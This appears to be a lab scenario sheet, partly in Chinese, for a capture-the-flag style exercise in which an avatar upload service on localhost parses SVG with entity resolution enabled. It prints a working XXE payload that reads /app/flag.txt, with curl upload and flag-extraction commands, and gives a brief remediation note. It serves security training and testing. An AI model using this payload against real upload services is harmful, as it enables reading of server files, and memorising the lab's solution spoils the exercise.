# WEB-14: XXE SVG Upload

## 场景信息

| 字段 | 值 |
|---|---|
| ID | WEB-14 |
| 名称 | XXE SVG Upload |
| 技术/CVE | XXE (XML External Entity) |
| 难度 | L2 |
| 交付方式 | Docker Compose |
| 入口 | localhost:10114 |

## 场景概述
- 技术：XXE (XML External Entity)
- 难度：L2
- 交付方式：docker
- 入口端口：10114
## 攻击路径与利用步骤

### Overview
| Property | Value |
|----------|-------|
| CVE/Technique | XXE via SVG |
| Difficulty | L2 |
| Port | 10114 |
| Path | scenarios/web/xxe-svg/ |
| Type | docker |
| Service | Profile Avatar Upload Service |

### Attack Path Summary
```
Upload SVG avatar → SVG parsed with resolve_entities=True → XXE → File read
```

### Prerequisites

#### Knowledge
- SVG文件格式 (SVG file format): Understanding SVG XML structure and common elements
- SVG内嵌XXE (XXE embedded in SVG): How to embed XXE payloads within SVG XML files
- multipart文件上传 (Multipart file upload): HTTP multipart/form-data upload mechanism

#### Tools
- curl: Upload files using multipart/form-data requests
- Python3: Create the SVG payload file programmatically

### Step-by-Step Exploitation

#### Step 1: Access the Upload Form

Open the avatar upload service to view the upload interface.

```bash
curl http://localhost:10114/
```

#### Step 2: Create Malicious SVG with XXE Payload

Create an SVG file containing an XXE payload that reads the flag file.

```bash
cat > payload.svg << 'EOF'
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///app/flag.txt">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <text x="10" y="20">&xxe;</text>
</svg>
EOF
```

#### Step 3: Upload the Malicious SVG

Submit the SVG file via the avatar upload endpoint.

```bash
curl -X POST http://localhost:10114/upload -F "file=@payload.svg"
```

#### Step 4: Flag Extraction

The server parses the SVG XML and substitutes the `&xxe;` entity with the flag file content in the response output.

### Flag Location
- `/app/flag.txt` in the application container

### Verification Commands
```bash
curl -s -X POST http://localhost:10114/upload -F "file=@payload.svg" | grep -o 'flag{[^}]*}'
```

## 此场景利用了哪些知识

| 规划维度 | 所需知识 |
|---|---|
| 环境与访问 | SVG upload pipeline and XML parser |
| 侦察与前置条件 | SVG content validation and entity resolution behavior |
| 核心漏洞与利用 | Embed XXE in an SVG document |
| 权限、横向或影响 | Server-side file disclosure through image processing |
| 验证 | Read the flag returned by the SVG processing path |

## 修复建议
升级或修复对应组件，移除导致攻击路径的非必要权限、网络暴露或不安全默认配置，并在修复后复测本指南中的利用步骤。
